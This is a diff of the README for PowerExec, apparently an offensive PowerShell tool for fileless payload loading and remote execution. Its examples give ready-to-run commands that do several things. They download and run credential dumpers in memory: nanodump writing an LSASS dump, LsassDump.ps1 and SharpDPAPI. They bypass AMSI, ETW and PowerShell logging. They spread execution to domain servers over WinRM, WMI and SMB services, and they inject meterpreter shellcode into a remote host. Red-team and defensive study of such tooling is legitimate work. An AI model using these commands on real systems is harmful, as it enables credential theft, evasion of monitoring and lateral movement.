@@ -6,8 +6,8 @@ PowerExec combines various bypass techniques and execution methods for fileless 
 ## Functions
 
 ```
+New-PowerLoader                 -   builds PowerShell script block for in-memory execution of various payload types
 Invoke-PowerExec                -   runs PowerShell script block on remote computers through various execution methods
-New-PowerLoader                 -   builds script block for in-memory execution of various payload types
 ```
 
 
@@ -25,6 +25,8 @@ The payload type must be specified within the function `New-PowerLoader`:
 Resulting PowerShell script block is built either from a local payload file or from a remote payload using a download cradle.
 
 Please note that PE execution output will only be retrieved when run locally, not remotely.
+Also, shellcode execution output can't be retrieved since it is injected in a detached process.
+
 
 ## Bypass techniques
 
@@ -54,31 +56,38 @@ The execution method must be specified within the function `Invoke-PowerExec`:
 | SmbTask         | Create temporary scheduled task leveraging SMB named pipe | NT AUTHORITY\SYSTEM |
 | WinRM           | Run powershell via Windows Remote Management              | Current user        |
 
-For WMI methods, the transport protocol can be chosen between DCOM and WSMAN.
-
 The execution output is retrieved regardless of the method used.
+
+Please note that multi-threading is supported for WinRM method only.
+For WMI/CIM methods, the transport protocol can be chosen between DCOM and WSMAN.
 
 
 ## Examples
 
-Run a PowerShell script through WinRM while bypassing AMSI, PowerShell Module Logging and Script Block Logging:
+Run a remote PE locally while bypassing PowerShell Module Logging and Script Block Logging and AMSI:
 
 ```
-PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass AMSI,PML,SBL
-PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers
+PS C:\> & (New-PowerLoader -Type PE -FileUrl 'https://raw.githubusercontent.com/fortra/nanodump/main/dist/nanodump_ssp.x64.exe' -ArgumentList '-w','C:\Windows\Temp\lsass.dmp' -Bypass PML,SBL,AMSI)
 ```
 
-Run a .NET assembly through WMI while bypassing AMSI and ETW:
+Run a PowerShell script on domain servers through WinRM while bypassing ETW and AMSI:
+
+```
+PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass ETW,AMSI
+PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Theads 20
+```
+
+Run a .NET assembly on remote hosts through WMI while bypassing ETW and AMSI:
 
 ```
 PS C:\> $payload = New-PowerLoader -Type NetAsm -FileUrl 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpDPAPI.exe' -ArgumentList 'machinecredentials' -Bypass ETW,AMSI
-PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method CimProcess -Protocol Dcom -ComputerList 192.168.1.1,192.168.1.2
+PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method CimProcess -Protocol Dcom -Authentication Default -ComputerList 192.168.1.1,192.168.1.2
 ```
 
-Run a shellcode through a service:
+Run a raw shellcode on a remote host through a temporary service:
 
 ```
-PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -ComputerList 192.168.1.1 -Method CimService -Protocol Dcom
+PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -Method SmbService -ComputerList 192.168.1.1
 ```
 
 
